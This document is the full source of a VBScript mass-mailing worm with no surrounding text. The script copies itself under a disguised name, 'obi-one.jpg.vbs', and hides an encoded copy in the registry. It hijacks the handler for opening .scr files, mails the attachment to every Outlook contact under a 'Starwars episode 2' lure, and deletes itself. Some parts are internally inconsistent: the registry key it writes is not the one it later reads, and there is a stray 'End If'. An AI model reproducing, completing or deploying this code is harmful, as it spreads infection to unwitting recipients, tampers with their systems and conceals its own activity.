on error resume next
Dim fso, a, b, X, o, g, e
Set fso = CreateObject("Scripting.FileSystemObject")
set a = fso.OpenTextFile(Wscript.ScriptFullname, 1)
b = a.ReadAll
set h = fso.CreateTextFile("c:\windows\system\obi-one.jpg.vbs", True)
h.Write b
h.Close
For o = 1 to Len(b) 
X = X & Hex(Asc(Mid(b, o, 1)))
Next
set g = CreateObject("Wscript.Shell")
g.regwrite "HKEY_LOCAL_MACHINE\theforce", X 
g.regwrite "HKEY_CLASSES_ROOT\scrfile\shell\open\command\", "wscript.exe c:\windows\system\winupdate.vbs"
mail() 
decoder = "on error resume next" & vbcrlf & _ 
"dim e, y, z, data" & vbcrlf & _
"e = fromreg(""HKEY_LOCAL_MACHINE\Alcopaul"")" & vbcrlf & _
"function fromreg(gg)" & vbcrlf & _
"Set regedit = CreateObject(""WScript.Shell"")" & vbcrlf & _
"fromreg = regedit.regread(gg)" & vbcrlf & _
"end function" & vbcrlf & _
"For y = 1 to Len(e) Step 2" & vbcrlf & _ 
"z = z & Chr(""&h"" + Mid(e, y, 2))" & vbcrlf & _
"next" & vbcrlf & _ 
"data = replace(z, Chr(""&hDA""), vbcrlf)" & vbcrlf & _ 
"Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbcrlf & _
"set h = fso.CreateTextFile(""c:\registry.vbs"", True)" & vbcrlf & _
"h.Write data" & vbcrlf & _
"h.Close" & vbcrlf & _
"Set fsa = CreateObject(""Wscript.Shell"")" & vbcrlf & _
"fsa.Run(""c:\registry.vbs"")" & vbcrlf & _
"msgbox ""Checking registry values"", ,""Scanreg""" & vbcrlf & _ 
"fso.deletefile(""c:\registry.vbs"")"
set j = fso.CreateTextFile("c:\windows\system\winupdate.vbs", True)
j.write decoder
j.close
fso.deletefile(wscript.scriptfullname)

sub mail()
on error resume next
Set ol=CreateObject("Outlook.Application") 
Set out= WScript.CreateObject("Outlook.Application") 
Set mapi = out.GetNameSpace("MAPI") 
Set a = mapi.AddressLists(1) 
Set ae=a.AddressEntries 
For x=1 To ae.Count 
Set Mail=ol.CreateItem(0) 
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) 
Mail.Subject="Starwars episode 2" 
Mail.Body="preview it now exclusively !!!" 
Mail.Attachments.Add("c:\windows\system\obi-one.jpg.vbs")
Mail.Send
Mail.DeleteAfterSubmit = True
Next 
ol.Quit 
End If
Set fso = CreateObject("Scripting.FileSystemObject")
fso.deletefile("c:\windows\system\obi-one.jpg.vbs")
end sub
